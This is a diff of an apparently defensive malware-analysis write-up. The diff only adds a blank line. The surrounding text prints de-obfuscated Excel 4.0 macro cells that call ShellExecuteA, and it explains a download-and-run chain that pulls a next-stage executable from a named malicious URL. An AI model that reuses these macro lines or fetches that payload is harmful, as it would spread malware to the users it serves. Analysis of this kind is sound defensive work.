@@ -137,6 +137,7 @@ Regardless of the technique followed, both tool dump the same de-obfuscated macr
 ' CELL:DW1339    , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",,0,0)
 ' CELL:DW1340    , End                 , HALT()
 ```
+
 - It creates a new directory `C:\jhbtqNj\IOKVYnJ` via `CreateDirectoryA`.
 - It calls `URLDownloadToFileA` to download next stager from `http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exRUN(...)` and saves it as `KUdYCRk.exe` in the created directory. It then executes the next stager by calling `ShellExecuteA`.
 
